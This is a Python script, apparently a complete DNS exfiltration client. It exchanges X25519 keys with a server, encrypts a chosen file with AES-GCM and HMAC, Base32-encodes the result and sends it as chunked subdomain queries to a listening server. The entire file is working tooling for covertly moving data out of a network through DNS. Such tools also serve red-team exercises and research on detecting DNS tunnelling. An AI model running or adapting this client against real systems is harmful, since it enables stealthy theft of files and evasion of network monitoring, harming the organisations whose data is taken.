#!/usr/bin/env python3
"""
Module Name: client.py

Description:
    DNS exfiltration client using X25519 key exchange, AES-GCM encryption,
    Base32 encoding, and HMAC for integrity.

    - Derives a per-transfer AES key and HMAC key via ECDH (X25519 + HKDF).
    - Encrypts file with AES-GCM, appends HMAC tag, then Base32-encodes.
    - Splits Base32 string into DNS-safe chunks and sends as subdomains.

Author: John Burns
Date: 2025-05-02
Version: 2.2 (Refactored for clarity)
"""

import argparse
import base64
import hashlib
import hmac
import logging
import os
import socket
import sys
from uuid import uuid4

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import x25519
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from dnslib import DNSRecord, DNSQuestion, QTYPE
from dotenv import load_dotenv, find_dotenv

# Setup
load_dotenv(find_dotenv())
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger('client')

# Constants
MAX_RETRIES = 3
DNS_IP = '192.0.2.1'


def load_server_public_key(path):
    """
    Load X25519 server public key from raw file.
    """
    with open(path, 'rb') as f:
        data = f.read()
    return x25519.X25519PublicKey.from_public_bytes(data)


def derive_shared_keys(client_priv, server_pub):
    """
    Perform ECDH and derive AES-GCM key and HMAC key.
    Returns (aes_key, hmac_key).
    """
    shared = client_priv.exchange(server_pub)
    material = HKDF(algorithm=hashes.SHA256(), length=48, salt=None, info=b'dns-exfil').derive(shared)
    return material[:32], material[32:]


def encrypt_and_hmac(file_path, aes_key, hmac_key):
    """
    Read file, encrypt with AES-GCM, append HMAC-SHA256 tag.
    Returns raw bytes.
    """
    with open(file_path, 'rb') as f:
        plaintext = f.read()

    aesgcm = AESGCM(aes_key)
    nonce = os.urandom(12)
    ciphertext = aesgcm.encrypt(nonce, plaintext, associated_data=None)

    tag = hmac.new(hmac_key, nonce + ciphertext, hashlib.sha256).digest()
    return nonce + ciphertext + tag


def base32_encode(data):
    """
    Base32-encode and strip padding.
    """
    b32 = base64.b32encode(data).decode('ascii')
    return b32.rstrip('=')


def chunk_payload(b32_string, identifier, domain):
    """
    Split Base32 string into DNS-safe subdomains.
    """
    max_label = 63 - (len(identifier) + len(domain) + 2)
    segments = [b32_string[i:i + max_label] for i in range(0, len(b32_string), max_label)]
    total = len(segments)
    for idx, seg in enumerate(segments):
        yield f"{identifier}-{idx}-{total}-{seg}"


def send_query(subdomain, args):
    """
    Send a single DNS A query.
    Returns True on success.
    """
    fqdn = f"{subdomain}.{args.domain}"
    q = DNSRecord(q=DNSQuestion(fqdn, QTYPE.A))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)
    try:
        sock.sendto(q.pack(), (args.server_ip, args.server_port))
        resp, _ = sock.recvfrom(512)
        logger.debug(f"Response: {DNSRecord.parse(resp)}")
        return True
    except Exception as e:
        logger.warning(f"Query failed for {subdomain}: {e}")
        return False
    finally:
        sock.close()


def reliable_send(subdomain, args):
    """
    Attempt to send DNS query with retries.
    """
    for attempt in range(1, MAX_RETRIES + 1):
        if send_query(subdomain, args):
            return True
        logger.info(f"Retry {attempt} for {subdomain}")
    return False


def perform_key_exchange(identifier, args):
    """
    Generate ephemeral keypair, send public in chunks, derive shared keys.
    Returns (aes_key, hmac_key).
    """
    server_pub = load_server_public_key(args.server_pubkey)
    client_priv = x25519.X25519PrivateKey.generate()
    pub_bytes = client_priv.public_key().public_bytes(encoding=serialization.Encoding.Raw,
        format=serialization.PublicFormat.Raw)
    b32_pub = base32_encode(pub_bytes)
    # split into 50-char fragments
    parts = [b32_pub[i:i + 50] for i in range(0, len(b32_pub), 50)]
    for frag in parts:
        sub = f"{identifier}-0-0-{frag}"
        reliable_send(sub, args)
    return derive_shared_keys(client_priv, server_pub)


def main(args):
    identifier = uuid4().hex[:8]
    # Key exchange
    aes_key, hmac_key = perform_key_exchange(identifier, args)
    logger.info(f"Keys established for session {identifier}")

    # Encrypt, HMAC, Base32
    raw_blob = encrypt_and_hmac(args.file_path, aes_key, hmac_key)
    b32 = base32_encode(raw_blob)
    logger.debug(f"Base32 length: {len(b32)}")

    # Send data chunks
    failures = []
    for sub in chunk_payload(b32, identifier, args.domain):
        if not reliable_send(sub, args):
            failures.append(sub)

    if failures:
        logger.error(f"Failed chunks: {failures}")
        sys.exit(1)
    logger.info("All chunks sent successfully")


def parse_args():
    p = argparse.ArgumentParser(description="DNS Exfiltration Client (ECDH + AES-GCM + HMAC)")
    p.add_argument('--server-ip', default='127.0.0.1')
    p.add_argument('--server-port', type=int, default=5300)
    p.add_argument('--file-path', required=True)
    p.add_argument('--domain', default='xf.example.com')
    p.add_argument('--server-pubkey', default=os.getenv('SERVER_PUBLIC_KEY'), help='Path to server public key')
    return p.parse_args()


if __name__ == '__main__':
    args = parse_args()
    main(args)
